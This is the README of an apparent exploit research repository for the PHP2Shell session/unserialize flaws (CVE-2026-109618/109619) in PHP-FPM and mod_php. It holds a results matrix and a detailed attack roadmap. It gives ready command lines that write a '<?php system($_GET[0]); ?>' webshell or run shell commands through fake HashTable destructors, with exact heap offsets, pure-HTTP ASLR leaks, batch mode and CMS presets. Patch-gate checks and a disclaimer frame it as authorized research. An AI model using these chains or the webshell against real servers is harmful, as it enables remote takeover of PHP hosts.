# PHP2Shell Research

[English](README_EN.md) | 中文

> **免责声明**
>
> 本项目仅用于**授权安全研究、漏洞复现与防御验证**。除此以外的任何用途
> （包括但不限于未授权访问、攻击第三方系统、破坏性使用、批量扫描或
> 商业化滥用）产生的后果由使用者自行承担；作者不承担任何责任。
> 使用本项目即表示你已获得目标所有者的明确书面授权，并遵守当地法律。

---

## 简介

PHP2Shell 是 PHP 会话/反序列化跨请求漏洞族（CVE-2026-109618 /
CVE-2026-109619）。本仓库聚焦 **PHP-FPM** 利用面，提供两条可复现的研究链：

- **128M FPM 链**：确定性的 `ps_files` 任意文件写 → webshell；
- **8M FPM reclaim 链**：8KB multipart 字段覆盖已释放的
  `php_unserialize_data`，伪造 `var_hash`，通过假 HashTable 的析构器
  触发 `zif_system`。

仓库同时包含 profiles、校准工具、靶场配置、研究笔记和完整 ASCII 路径图。

---

## 能力与状态

| 能力 | 状态 | 证据 |
|---|---|---|
| FPM 8.4.26 / 128M / 1 worker | 已验证 | 4/4 `uid=33(www-data)` |
| FPM 8.4.26 / 128M / 4 workers | 已验证 | 4/4 `uid=33(www-data)` |
| 官方 stripped `php:8.4.26-fpm` / 128M | 已验证 | 1w 3/3 + 4w 1/1 |
| FPM 8.4.26 / 8M reclaim / 1 worker | 已验证（debug build） | 3/3 `uid=33(www-data)` |
| FPM 8M `no-oracle`（给定 chunk/PIE） | 已验证 | 1/1 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / debug / 1w | 已验证 | 3/3 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / 官方 stripped / 1w | 已验证 | 3/3 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / 官方 stripped / 4w | 已验证 | 3/3 `uid=33(www-data)`（pin 3 child） |
| clean-room p2s warning 链（mod_php / de=On） | 已验证 | 8M 1w/4w 3/3；64M–256M 1/1；`oracle=http` |
| clean-room p2s pure128（de=Off / 128M / chunked） | 已验证 | 1w/5w/150w 3/3、2w 1/1；`decoded=819200` |
| PHP 8.5.11 FPM / 128M / 1 child / pure HTTP | 已验证 | R1→R2a→R1(K2)→R2a(K2)→R3 无 gdb 3/3 `uid=33`；ROUNDS=3；x.php 392B；`gdb_hits=0` |
| PHP 8.2.34 FPM / 128M / 1 child / pure HTTP（真 CVE 象限） | 已验证 | `PROFILE=8234` 同构移植 3/3 `uid=33`；矩阵 `fpm-8234-http-1w` |
| PHP 8.5.11 FPM / 128M / 4 workers / pure HTTP | 已验证 | `WORKERS=4` lab pinning（3×`_sleep.php`+free=1）+ `ASSERT4` 3/3 `uid=33`；ROUNDS=3 301s；矩阵 `fpm-8511-http-4w` |
| PHP 8.2.34 FPM / 128M / 4 workers / pure HTTP（真 CVE 象限） | 已验证 | `PROFILE=8234 WORKERS=4` 同构 3/3 `uid=33`（248.3s）；矩阵 `fpm-8234-http-4w` |
| PHP 8.2.35 FPM / 128M / 1 child（8.2 分支修复侧；gate） | 已验证（kind=gate） | fail-closed `PATCH GATE: closed` 3/3 exit 0；8.2.34 正对照 `OPEN` 3/3 exit 3；矩阵 `fpm-8235-gate` |
| PHP 8.5.12 FPM / 128M / 4 workers（patched gate；pin 模式） | 已验证（kind=gate） | `WORKERS=4` pinning + `_sleep.php`：`PATCH GATE: closed` 3/3 exit 0；8.5.11 4w 正对照 `OPEN` 3/3 exit 3；矩阵 `fpm-8512-gate-4w` |
| PHP 8.2.35 FPM / 128M / 4 workers（patched gate；pin 模式） | 已验证（kind=gate） | `PROFILE=8235 WORKERS=4`：`PATCH GATE: closed` 3/3 exit 0（SR 456→361→698、BG 0）；8.2.34 4w 正对照 `OPEN` 3/3 exit 3；矩阵 `fpm-8235-gate-4w` |
| PHP 8.3.36 FPM / 128M / 4 workers（patched gate；pin 模式） | 已验证（kind=gate） | `PROFILE=8336 WORKERS=4`：`PATCH GATE: closed` 3/3 exit 0（SR 456→361→698、BG 0@+0x360）；8.3.35 4w 正对照 `OPEN` 3/3 exit 3；矩阵 `fpm-8336-gate-4w` |
| PHP 8.4.27 FPM / 128M / 4 workers（patched gate；已注册，正对照 8.4.26 OPEN 3/3） | 已验证（kind=gate） | `PROFILE=8427 WORKERS=4`：`PATCH GATE: closed` 3/3 exit 0（grow 7,050,470、SR 469→374→724、BG 0@+0x370）；8.4.26 4w 正对照 `OPEN` 3/3 exit 3（47/70、x.php 392B、uid=33）；矩阵 `fpm-8427-gate-4w` |
| profiles / CMS 预设 | 已提供 | `src/profiles.py`、`src/cms_profiles.py` |
| 布局/冒烟测试 | 通过 | 22/22 unit tests、`SMOKE_OK`、`RECLAIM_SMOKE_OK` |

开放研究问题：

- 128M 应用（WP/Laravel）的 HTTP-only chunk/PIE leak（D 在 non-main chunk，
  字段副本进不去）；
- Symfony / Laravel 默认 database+redis session 的 producer；
- 8M 链在 `pm = dynamic` 下的形态；
- T2 `psv` 相位对比 / T3 第二条 libphp 泄露通道；
- 非 FPM SAPI（LSAPI/FrankenPHP）。

---

## 快速开始

要求：Python 3.10+（仅标准库）、Docker（靶场）、Linux（FPM 靶场）。

```bash
python3 -m unittest discover -s tests -v
python3 src/tools/fpm_chain_smoke.py     # SMOKE_OK
python3 src/tools/fpm_reclaim_smoke.py   # RECLAIM_SMOKE_OK
```

### 128M FPM

```bash
php-fpm -D -y /srv/www-1.conf -c /srv/php-128m.ini
nginx -g 'daemon off;'

python3 src/tools/fpm_chain.py \
  --url http://127.0.0.1 --workers 1 --attempts 1 --stages r3 \
  --e-off 0x83000 --dt-off 0x6b000 --writer 0x581e0 \
  --big-dt-size 13312 --big-e-size 45056 \
  --base-dt 0x68018 --base-e 0x81018 \
  --r3-scalars 2 --victim-sid vic --victim-path /sess.php \
  --r3-key '<?php system($_GET[0]); ?>' --r3-dt-used 0 \
  --big 53 --prime-press 400 --plain /index.php --index /index.php
```

### 8M reclaim

```bash
# 基址来自 lab oracle（gdb / /proc）
python3 src/tools/fpm_reclaim.py \
  --base http://127.0.0.1:8080 --builder http://127.0.0.1:8081 \
  --chunk <chunk> --pie <pie> --zif-offset <off> \
  --d-off 0x6f000 --k 0xfe8 --pads '' --size 8192 \
  --cmd 'id>out/p1' --proof /out/p1

# 纯 HTTP：先 leak chunk/PIE 再跑 endgame（无需调试器）
python3 src/tools/fpm_reclaim.py \
  --base http://127.0.0.1:8080 --builder http://127.0.0.1:8081 \
  --zif-offset 0x50a0f0 --leak --leak-profile official \
  --cmd 'id>out/p1' --proof /out/p1
```

靶场配置与页面在 `labs/fpm/` 和 `labs/fpm/reclaim/`；`--leak` 通过
`src/tools/fpm_leak.py` 在 HTTP 上取 chunk/PIE，debug 与官方 stripped 镜像
都适用。proof 文件是唯一 oracle；consumer 的 502 是预期行为。

---

## mod_php 链（clean-room `p2s/`）

`src/p2s/` 是自实现代码（MIT），包含 warning 链（de=On）与 pure128 链
（de=Off/128M、chunked）；不依赖任何第三方上游代码。

```bash
export PYTHONPATH=src
python3 -m p2s.cli -u http://127.0.0.1:19016/index.php --check
python3 -m p2s.cli -u http://127.0.0.1:19016/index.php --run \
  --container <lab> --container-proof /out/p1 \
  --fetch-match uid= --cmd 'id>/out/p1'
python3 -m p2s.cli -u http://127.0.0.1:19068/index.php --pure128 --run \
  --container <lab> --container-proof /out/p1 \
  --fetch-match uid= --cmd 'id>/out/p1'
```

所有链均为 p2s 自实现（MIT）；lab-only `exploit.py` **不在发布树**，发布树
也不含任何第三方漏洞利用代码。

---

## 目录结构

```text
src/            FPM 链、profiles、校准工具
labs/           PHP-FPM 与 Apache 靶场
docs/           研究笔记、地图、可复现性、许可
tests/          纯 Python 布局/冒烟测试
```

---

## 研究文档

| 文档 | 内容 |
|---|---|
| [docs/research/overview.md](docs/research/overview.md) | 问题、两条 FPM endgame、研究问题 |
| [docs/research/fpm-128m.md](docs/research/fpm-128m.md) | 128M 链：`var_push`、`ps_files`、几何、proof |
| [docs/research/fpm-8m-reclaim.md](docs/research/fpm-8m-reclaim.md) | 8M reclaim：producer、8KB reclaim、假 HashTable |
| [docs/research/fpm-8m-http-leak.md](docs/research/fpm-8m-http-leak.md) | 8M HTTP-only chunk/PIE leak、官方 stripped、4 worker |
| [docs/research/fpm-8m-prime.md](docs/research/fpm-8m-prime.md) | 8M prime、空 chunk、结构性墙 |
| [docs/research/methods.md](docs/research/methods.md) | M1–M8 研究方法 |
| [docs/research/claims.md](docs/research/claims.md) | 结论与证据强度 |
| [docs/research/fpm-8511-http.md](docs/research/fpm-8511-http.md) | PHP 8.5.11 / 128M pure-HTTP gdb-free 链（3/3 `uid=33`） |
| [docs/research/fpm-8234-port.md](docs/research/fpm-8234-port.md) | 8.2.34-FPM 真 CVE 象限同构移植（`PROFILE=8234`） |
| [docs/research/fpm-8234-4w.md](docs/research/fpm-8234-4w.md) | 8.2.34-FPM 128M 4-worker pure-HTTP 链（lab pinning + `ASSERT4`） |
| [docs/research/fpm-8511-4w.md](docs/research/fpm-8511-4w.md) | 8.5.11-FPM 128M 4-worker pure-HTTP 链；BG 双偏移修复 |
| [docs/research/fpm-8235-gate.md](docs/research/fpm-8235-gate.md) | 8.2.35-FPM fail-closed patch gate（8.2 分支修复侧） |
| [docs/research/fpm-8512-gate-4w.md](docs/research/fpm-8512-gate-4w.md) | 8.5.12-FPM 4-worker fail-closed patch gate（pin 模式；含首跑假阳性教训） |
| [docs/research/fpm-8513-readiness.md](docs/research/fpm-8513-readiness.md) | 8.5.13 发布日就绪：状态/apiki 陷阱/gate 准备/24h checklist |
| [docs/research/fpm-8235-gate-4w.md](docs/research/fpm-8235-gate-4w.md) | 8.2.35-FPM 4-worker fail-closed patch gate（pin 模式） |
| [docs/research/fix-commits-2026-10-31.md](docs/research/fix-commits-2026-10-31.md) | CVE-2026-109618/109619 上游修复提交与 gate 机制映射 |
| [docs/research/fpm-8336-gate-4w.md](docs/research/fpm-8336-gate-4w.md) | 8.3.36-FPM 4-worker fail-closed patch gate（pin 模式；BG `+0x360`） |
| [docs/research/e7-mechanism-verification.md](docs/research/e7-mechanism-verification.md) | E7 机制运行时验证（dynsym/early_rinit/delayed OOM/incomplete-only） |
| [docs/research/fpm-8427-gate-4w-poc.md](docs/research/fpm-8427-gate-4w-poc.md) | 8.4.27-FPM 4w gate（8.4.26 校准后注册；正对照 OPEN 3/3） |
| [docs/research/gate-family-crossbranch-2026-10-31.md](docs/research/gate-family-crossbranch-2026-10-31.md) | 跨分支 gate 家族 full 3×（18/18 gates + 12/12 controls PASS；selector 修复） |
| `labs/fpm/r49_release_day_8513.sh` | 8.5.13 发布日一键 pipeline（build→DIAG→gate→8.5.11 对照→unknown） |
| `labs/fpm/r50_release_day_any.sh` | 通用分支发布日 pipeline（FAMILY 82\|83\|84\|85；fail-closed） |
| [docs/research/patch.md](docs/research/patch.md) | 补丁边界与门禁 |
| [docs/research/cms.md](docs/research/cms.md) | CMS 矩阵与 WordPress A1 根因 |
| [docs/research/t2-t3.md](docs/research/t2-t3.md) | T2/T3 研究笔记 |
| [docs/ROADMAP.md](docs/ROADMAP.md) | 完整 ASCII 全域路径图 |

---

## 复现与验证

- 128M：`docs/research/fpm-128m.md`；
- 8M reclaim：`docs/research/fpm-8m-reclaim.md`；
- 8M HTTP-only leak：`docs/research/fpm-8m-http-leak.md`；
- 靶场：`labs/fpm/`、`labs/fpm/reclaim/`；
- 验证规则：proof 文件开跑前清理，内容必须匹配（如 `uid=`），
  单次 proof 不等于确定性。

---

## 许可

本仓库原创代码采用 **MIT License**，见 [LICENSE](LICENSE)。

---

## 致谢

- **Wiz Research** — PHP2Shell 漏洞披露与分析；
- **kengwang** — FPM 链与 8M 研究；
- **cbovin** — profile/offset 交叉核对；
- **VABISMO** — 8M reclaim endgame 思路；
- **devploit** — 研究版工程结构参考。

---

## 引用

见 [CITATION.cff](CITATION.cff)。引用本仓库时请同时引用 Wiz Research 的
PHP2Shell 原始披露。

---

## ASCII 全域路径图

```text
==========================================================================================
 PHP2Shell (CVE-2026-109618 / CVE-2026-109619) 全域路径
 版本  研究快照 2026-10-31 v20（FPM 详细图保留 2026-10-26 snapshot；2026-10-31 增补见 docs/ROADMAP.md What changed 段）
 图例  [OK] 已验证   [~~] 有条件/部分   [XX] 未打通   [--] 未开始
       (!) 本轮新结论/新证据
 基线  lab matrix 65/65 按预期（51 proof + 2 refuse + 6 gap + 6 gate；http-only 23/65）
       lab regression matrix
==========================================================================================

LAYER 0  触发原语（producer：让请求 OOM 在半初始化处，留下悬空全局）
--------------------------------------------------------------------------------
  [OK] warning 链 OOM（de=On）
       max_input_vars warning 强制 headers_sent=1；8.4.26 8M–256M
  [OK] pure128 A1（de=Off/128M）
       OOM 在 php_session_reset_id -> php_url_encode（4096 页）
  [OK] 空 session.save_path 不影响 pure128
       1w/2w/5w 各 1/1 PROOF；旧 0/3 是重试预算/亲和问题（docs/research/claims.md）
  [OK] chunked 无 Content-Length
       PHP 跳过 post_max_size；8.3.35 / 8.5.11 128M 直接 proof
  [OK] FPM R1 prime（128M）
       upload progress + 30MB session + 60 层 press 数组
  [OK] FPM R1 prime（8M，(!) 本轮复现）
       73 小请求 + 1MB 文件名 -> sess_* 1,023,325B；
       prime 700x4000 + DUP -> HTTP 500、worker 存活
  [OK] FPM 8M reclaim producer（(!) docs/research/fpm-8m-reclaim.md）
       64M builder 写 4MB session；8M chain 在 RINIT 后 decode OOM；
       worker 存活，BG(unserialize)={level=1,data=d}
  [~~] de=Off/8M 的 A 形状
       the off probe 的 OOM 在 reset_id，但读窗口只有 4000B，无 libphp
  [--] 109618 multipart header 洪泛
       官方主路径，仍未实现 header-flood producer

LAYER 1  状态跨越（consumer：下一请求在 RINIT 前消费悬空全局）
--------------------------------------------------------------------------------
  [OK] stale PS(id)                 -> B 的 php_url_encode 越界读 -> Set-Cookie
  [OK] stale PS(http_session_vars)  -> stage3 攻击面（warning / pure128）
  [OK] stale BG(unserialize)（128M FPM） -> ps_files 重开 -> 任意文件写
  [OK] stale BG(unserialize)（8M FPM）   -> (!) reclaim 8KB -> 假 HashTable
                                            -> zif_system（docs/research/fpm-8m-reclaim.md；docs/research/fpm-8m-http-leak.md）
                                            HTTP-only 3/3：debug / 官方 1w / 4w
  [OK] 8M FPM HTTP-only leak              -> (!) 4KB+pads -> chunk；
                                            16KB fake zval -> PIE（docs/research/fpm-8m-http-leak.md）
  [~~] 8M FPM 头保护（ps_files 备选）     -> (!) 结构性墙；reclaim 已绕开
  [OK] stale BG(unserialize)（mod_php）  -> UAF 受控 16B 写（lab，无 RCE）
  [XX] 8.4.27+                      MULTIPART_EVENT_START 复位 + early_rinit
  (!) 8.4.15/8.4.26 OOM 后 child 不退出（delayed OOM）
      形状扫描必须先 kill child，否则堆状态漂移，结果非单调
  (!) FPM 8M prime 后主 chunk 整体空闲（free_pages=511）
      data/last/last_dtor 指向空闲页；R3 第一个 3 页分配即可复用

LAYER 2  地址泄露（ASLR）
--------------------------------------------------------------------------------
  [OK] stage1 chunk base            4KB（8M warning）/ 819KB（128M pure128）
  [OK] stage2 libphp base           HashTable pDestructor -> zval_ptr_dtor
  [OK] pure128 合并泄露             chunk + libphp 一次 B1（819208B）
  [OK] FPM 128M 链                  不需要泄露：任意文件写 -> webshell
  [~~] 8.2 分支                     仅 /proc/1/maps（RCE-LOCAL-BASE）
  [XX] de=Off / 8M                  读窗口钉死 4000B，47 指针全在 chunk 内
  [XX] T3 delta 假设                实测 spread 0xCA000，不是常量（已关闭）
  [OK] FPM 8M HTTP-only              (!) 阶段1 chunk + 阶段2 PIE（docs/research/fpm-8m-http-leak.md）
       chunk                        2MB 对齐多数投票（堆指针偏移随 worker 变）
       PIE（debug）                 H=chunk+0x1d0，r+0x3e38=pie+0x31d400
       PIE（official）              H=chunk+0x56c60，r+0x13b8=pie+0x7038e0
                                    崩后 respawn 的 worker 上仍稳定

LAYER 3  控制流劫持 / 落点写入
--------------------------------------------------------------------------------
  [OK] fake HashTable + pDestructor = zif_system      16M–256M 已验证
  [OK] fake zend_reference / fake execute_data        已验证
  [OK] FPM ps_files writer（128M）                    last_key/basedir 双 var_push
  [OK] FPM 任意文件写（128M）                         /srv/www/shell.php -> uid=33
  [OK] FPM 8M reclaim endgame（(!) docs/research/fpm-8m-reclaim.md）          假 zend_reference ->
                                                      假 HashTable -> zif_system
                                                      debug 3/3 + 官方 1w 3/3
                                                      + 官方 4w 3/3（pin 3）
  [~~] FPM ps_files writer（8M）                      (!) writer=0x581e0 已测；
                                                       E aim/fake string 未落点
  [~~] UAF 直接写                                     ht+0x30 需 k=6，中间写破坏 HT
  [XX] T2 直接写                                      psv 在分配族下方，够不到

LAYER 4  几何（构建 × 配置 × 请求形状）
--------------------------------------------------------------------------------
  [OK] 8.4.26 8M–256M               psv/htdata/a_extra/f_pads 已固化
  [OK] 8.5.11 8M / 16M              独立偏移，原几何
  [OK] 8.3.35 8M                    需要第 2 个堆候选
  [OK] 8.2.12 / 8.2.34              psv 0x56180；htdata 各不同
  [OK] pure128 128M                 S=main+0xF8398；384B fake array；231B cmd
  [OK] FPM 8.4.26 128M              DT=13312 / E=45056 / writer 0x581e0
                                    r3-scalars N（N>=2 标量）；4w 同常量
  [OK] FPM 官方 stripped 8.4.26     堆常量可移植（1w 3/3 + 4w 1/1）
  [~~] 非 PHPSESSID                 >=8 字符可用；5–7 需重标 psv
  [XX] chunked 128M / 8.4.26        T2：psv=0x550a0 在所有分配之下
  [~~] FPM 8M（(!) docs/research/fpm-8m-*.md：reclaim + HTTP-only 已闭环）
       [OK] reclaim 8KB endgame 3/3 PROOF（debug, 1w）
       [OK] no-oracle（给定 chunk/pie）1/1
       [OK] HTTP-only leak（debug 两阶段 / 官方 stage2）
       [OK] 官方 stripped 8M：1w 3/3、4w 3/3（pin 3 child）
       [OK] 矩阵 fpm-8m-reclaim（官方 1w）PASS
       [XX] 8.3 / 8.5 未验证
       ps_files 备选：头结构墙仍在（text field body+string 连续）
  [XX] FPM 8.5.11                   stale 块 page 30+，R3 直接 502
  [XX] FPM 8.3.x                    未标定
  [XX] 应用构建 A1（WP 8.4.15）     OOM 落在 decode 的 8.2KB，不是 reset_id

LAYER 5  部署形态
--------------------------------------------------------------------------------
  [OK] 单 worker + de=On + post>mem      warning 链主场景
  [OK] 单 worker + de=Off + post<mem     pure128（chunked）
  [OK] 2w / 5w / 150w + pinner           10/10（pin 到 MaxRequestWorkers-1）
  [OK] FPM pm=static 1 / 4               prime 全部 child
  [~~] FPM pm=dynamic / 并发负载         未验证
  [XX] 非 PHPSESSID 5–7 字符
  [XX] LSAPI / FrankenPHP                无链
  [XX] 8.2 远程
  [~~] CMS                               MediaWiki RCE；WordPress/Roundcube/
                                         Drupal/Matomo/Nextcloud/phpMyAdmin gap

LAYER 6  工程化
--------------------------------------------------------------------------------
  [OK] profile / 规则库                  builds/index.json 5 verified + 指纹匹配
  [OK] 未知构建安全拒绝                  exit 5 UNKNOWN_BUILD
  [OK] 补丁门禁                          exit 3 PATCHED
  [OK] proof oracle                      本地/fetch/容器，开跑前清理
  [OK] 批量 / 快速前置 / CMS 模板        batch / fast_preflight / 16 presets
  [OK] lab matrix                          52/52 按预期（44 proof + 2 refuse
                                         + 6 gap；http-only 16/52）
  [OK] FPM lab runs                          fpm-128m-1w 88s / fpm-128m-4w 311s
                                         fpm-8m-reclaim 24s（官方 1w）
  [OK] gdb 工具                          zend-chunk/-bg/-ps/-land/-psfiles
                                         (!) + zend-runs / zend-run-at
  [OK] 研究仓库                          php2shell-research
                                         MIT（原创；p2s 自实现）
  [~~] geo_cal                            A-only 可靠；--full-chain EXPERIMENTAL
  [--] 远程指纹 -> 低置信度降级

==========================================================================================
 T12-8M 专项：nginx + PHP-FPM / 8M / de=Off / pm=static 1
==========================================================================================
  已确认（reclaim + HTTP-only，docs/research/fpm-8m-*.md）
    [OK] reclaim 8KB endgame 3/3 PROOF（debug, 1w）
         d=chunk+0x6f000, k=0xfe8, pads=[], size=8192
         consumer 502 -> /srv/www/out/p1 = uid=33(www-data)
    [OK] no-oracle（给定 chunk/pie）1/1 PROOF
    [OK] HTTP-only leak（debug 两阶段）3/3 端到端
         4KB + pads=[7168,1024] -> chunk；16KB fake zval -> PIE
    [OK] 官方 stripped 8M 1w 3/3 PROOF
         stage1 chunk + stage2 H=chunk+0x56c60 len=0x15833
         read+0x13b8 = pie+0x7038e0（崩后仍稳定）
    [OK] 官方 stripped 8M 4w 3/3 PROOF（pin.php pins max_children-1）
    [OK] 矩阵 fpm-8m-reclaim（官方 1w）PASS
    (!) endgame 无 proof 的坑：/srv/www/out 不存在，
        id>out/p1 重定向失败；跑前必须 mkdir + chmod 777
    [XX] 8.3 / 8.5 未验证

  旧 ps_files 链（备选，保留记录）
    [OK] prime 500，worker 存活
    [OK] data=chunk+0x6e000，last=0x139000(13)，last_dtor=0x71000(74)
    [OK] 主 chunk prime 后整体空闲（free_pages=511）
    (!) 结构性墙：text field body buffer 与 zend_string 连续，
        字符串要从 0x6f000 开始，body 必写 0x6e000
    [XX] 头结构保护 / two-field 真实落点 / R3 proof

  下一步
    1) FPM 8.3.x：镜像 + ps_globals + 一次 PROOF（P1）
    2) T15 WordPress A1：bin 128 让 OOM 回到 reset_id（P0）
    3) 8M OPcache Off 对照只作为边界记录（官方 On 已能打）
    4) 发布树同步本里程碑（fpm_leak/fpm_reclaim/docs/research/fpm-8m-http-leak.md）

==========================================================================================
 T12-128M 专项：nginx + PHP-FPM（已确定性）
==========================================================================================
  [OK] 8.4.26 / 128M / de=Off / pm=static 1      4/4 PROOF
  [OK] 8.4.26 / 128M / pm=static 4               4/4 PROOF（prime 全部 child）
  [OK] 官方 stripped php:8.4.26-fpm              1w 3/3 + 4w 1/1（常量可移植）
  [OK] 机制：var_push 每值一次；N>=2 标量 -> 第 N-1/N 次写 last_key/basedir
  [OK] 工具：--r3-scalars / --victim-sid / --victim-path / --r3-key
  [XX] 8.5.11                                    stale 块 page 30+，R3 502
  [--] 8.3.x                                     未标定
  [--] pm=dynamic / 并发                         未验证

==========================================================================================
 T15 专项：应用构建（WordPress 8.4.15）—— 根因未变
==========================================================================================
  环境  wordpress:6.8.3-php8.4-apache + 1 worker + save_path=/tmp + gdb
  A1 OOM 栈（gdb 实测）
    zend_mm_safe_error <- zend_mm_alloc_pages <- _emalloc_large
      <- php_var_unserialize_init          <- 8.2KB 的 php_unserialize_data
      <- ps_srlzr_decode_php <- php_session_decode
      <- php_session_initialize <- php_session_rfc1867_callback
  含义
    reset_id（url_encode 4096）已经成功 -> send_cookie 清零、Set-Cookie 已排队
    链需要的 "send_cookie=1 + 悬空 PS(id)" 从未形成 -> B1 必然无指针
  扫描结论
    parts / key_pad / progress_len / fillers / big_len 六维扫描
    找到的 4096 全部是 php_sapi_filter（解析期），不是 reset_id
  下一步
    按 bin 128 精确安排 A1：url_encode 是 96B（bin 128），
    该 bin 有空闲槽时不会 OOM；用 gdb 看 bin/page 状态，
    或用一批 96–128B 常驻字符串把 bin 占满

==========================================================================================
 T2 专项：chunked 128M / de=On（只对 8.4.26 成立）
==========================================================================================
   稳定事实
     A-only  psv = chunk+0x73000（10 次恒定，与 a_extra 无关）
     真实链  psv = chunk+0x550a0（post-rotate，3/3）
     差 0x1d560，由两次 rotate() 造成
   已排除
     [X] carrier 向上推（需 1019 filler > max_input_vars，且饱和）
     [X] 大字段块（起点恒 >=0x69xxx，要下移需负大小）
     [X] header-line 分配通道（bin-256、步长 0x100、起点 0x60400；40 组全败）
     [X] 8.3/8.5 同样配置直接 proof -> 这是 8.4.26 的 psv 特例
   下一步
     只做 8.4.26 与 8.3/8.5 的 psv 相位对比（不要再扫 filler）

==========================================================================================
 T3 专项：de=Off / 8M
==========================================================================================
   [OK] A 形状：the off probe 的 OOM 在 php_session_reset_id（session 阶段）
   [OK] stage1：chunk 泄露 4/4，但仅 read=4000 有效
   [XX] stage2：读窗口 4000B，47 指针全在 chunk 内，无 libphp
   [XX] stage3：被 stage2 阻塞
   [X]  delta 假设：spread 0xCA000，不是常量（docs/research/t2-t3.md）
   下一步
     第二条泄露通道（8M 下能打印/泄露 libphp 的 consumer），或换 consumer

==========================================================================================
 进度条（按象限加权，2026-10-26）
==========================================================================================
  控制流原语        ████████████████████ 100%
  ASLR 绕过         ███████████████████░  95%   8.2 与 8M-de=Off 除外
  mod_php RCE       ███████████████████░  95%   8.2–8.5 官方；T2 只在 8.4.26
  pure128 RCE       ████████████████████ 100%   含空 save_path、150w
  FPM RCE           ███████████████████░  92%   128M 确定性 + 8M HTTP-only 全链
  应用(CMS)适性     ███████░░░░░░░░░░░░░  35%   1/11 RCE
  非 mod_php/FPM    ░░░░░░░░░░░░░░░░░░░░   0%
  8.2 远程          ░░░░░░░░░░░░░░░░░░░░   0%
  -------------------------------------------------------------
  加权总体          ███████████████░░░░░  ~83%
==========================================================================================

 风险 / 铁律
--------------------------------------------------------------------------------
  1. 8M FPM 首选 reclaim 链（docs/research/fpm-8m-reclaim.md）：d=0x6f000, k=0xfe8, pads=[], size=8192；
     stock [4096,4096]/16KB 不覆盖 d，不要再直接套。
  2. ps_files 头保护只作为备选；docs/research/fpm-8m-prime.md 的 0x6d018/0x105018 仍不可直接用。
  3. T2/T3 不要参数搜索；T5 不要按 docs/research/claims.md 原结论做（已证伪）。
  4. A1/A 必须与生产形状逐字节一致；诊断字段只能加在 B。
  5. OOM 后 child 不退出：形状扫描前先 kill child（restart the child）。
  6. 分配大小不是判据：4096 可能是 php_sapi_filter；用 gdb/B1 定案。
  7. gdb 跟不过 rotate()：带 rotate 的链只能用 proof 文件做 oracle。
  8. 容器 IP/端口会漂移：用 docker inspect 取；网络坏了重建 bridge。
  9. 每次阶段性更新必须同步更新本图（见文首维护规则）。
 10. 官方 8M 的 PIE 用 chunk+0x56c60（不是 0x76020）；endgame 前先建
     /srv/www/out；官方 4w 必须 pin 3 个 child。
==========================================================================================
```
